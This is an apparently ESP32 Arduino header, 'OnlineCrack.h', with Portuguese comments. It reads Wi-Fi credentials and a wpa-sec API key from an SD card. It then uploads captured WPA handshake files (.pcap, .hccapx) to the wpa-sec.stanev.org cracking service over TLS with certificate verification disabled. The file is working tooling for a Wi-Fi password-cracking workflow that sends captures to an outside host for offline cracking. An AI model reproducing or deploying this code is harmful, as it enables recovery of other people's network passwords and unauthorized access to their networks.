#ifndef ONLINE_CRACK_H
#define ONLINE_CRACK_H

/**
 * OnlineCrack.h
 * Upload Manual de Capturas.
 */

#include <Arduino.h>
#include <WiFi.h>
#include <WiFiClientSecure.h>
#include <SD_MMC.h>
#include "FS.h"

struct WiFiConfig {
    String ssid;
    String pass;
    String wpa_sec_key;
};

class OnlineCrack {
public:
    static WiFiConfig loadConfig() {
        WiFiConfig cfg;
        cfg.ssid = "";
        cfg.pass = "";
        cfg.wpa_sec_key = "";

        // Caminho ajustado: /arquivos_cartao_sd/wifi_config.txt
        if (SD_MMC.exists("/arquivos_cartao_sd/wifi_config.txt")) {
            File f = SD_MMC.open("/arquivos_cartao_sd/wifi_config.txt");
            if (f) {
                while (f.available()) {
                    String line = f.readStringUntil('\n');
                    line.trim();
                    if (line.startsWith("SSID=")) cfg.ssid = line.substring(5);
                    else if (line.startsWith("PASS=")) cfg.pass = line.substring(5);
                    else if (line.startsWith("KEY=")) cfg.wpa_sec_key = line.substring(4);
                }
                f.close();
            }
        }
        return cfg;
    }

    static int uploadAll() {
        WiFiConfig cfg = loadConfig();

        if (cfg.ssid == "" || cfg.wpa_sec_key == "") {
            Serial.println("[Upload] Erro: Configure wifi_config.txt");
            return -1;
        }

        WiFi.begin(cfg.ssid.c_str(), cfg.pass.c_str());
        int retries = 0;
        while (WiFi.status() != WL_CONNECTED && retries < 20) {
            delay(500);
            retries++;
        }
        if (WiFi.status() != WL_CONNECTED) return -2;

        // Fila de envio: /arquivos_cartao_sd/fila_envio/
        File root = SD_MMC.open("/arquivos_cartao_sd/fila_envio");
        if (!root) {
             // Fallback: /arquivos_cartao_sd/capturas/
             root = SD_MMC.open("/arquivos_cartao_sd/capturas");
        }

        File file = root.openNextFile();
        int count = 0;

        while (file) {
            if (!file.isDirectory()) {
                String filename = String(file.name());
                if (filename.endsWith(".pcap") || filename.endsWith(".hccapx")) {
                    if (uploadFile(file, cfg.wpa_sec_key)) {
                        count++;
                    }
                }
            }
            file = root.openNextFile();
        }

        WiFi.disconnect();
        return count;
    }

private:
    static bool uploadFile(File& file, String key) {
        WiFiClientSecure client;
        client.setInsecure();

        if (!client.connect("wpa-sec.stanev.org", 443)) return false;

        String boundary = "------------------------Esp32Boundary";
        String fileName = String(file.name());
        size_t fileSize = file.size();

        String head = "--" + boundary + "\r\nContent-Disposition: form-data; name=\"key\"\r\n\r\n" + key + "\r\n";
        String fileHead = "--" + boundary + "\r\nContent-Disposition: form-data; name=\"file\"; filename=\"" + fileName + "\"\r\nContent-Type: application/octet-stream\r\n\r\n";
        String tail = "\r\n--" + boundary + "--\r\n";

        size_t totalLen = head.length() + fileHead.length() + fileSize + tail.length();

        client.println("POST /?api&dl=1 HTTP/1.1");
        client.println("Host: wpa-sec.stanev.org");
        client.println("Content-Type: multipart/form-data; boundary=" + boundary);
        client.print("Content-Length: "); client.println(totalLen);
        client.println("Connection: close");
        client.println();

        client.print(head);
        client.print(fileHead);

        uint8_t buf[512];
        while (file.available()) {
            size_t read = file.read(buf, 512);
            client.write(buf, read);
        }

        client.print(tail);

        long timeout = millis();
        while (client.connected() && !client.available()) {
            if (millis() - timeout > 10000) return false;
            delay(10);
        }

        bool success = false;
        while (client.available()) {
            String line = client.readStringUntil('\n');
            if (line.indexOf("HTTP/1.1 200") >= 0) success = true;
        }
        client.stop();
        return success;
    }
};

#endif
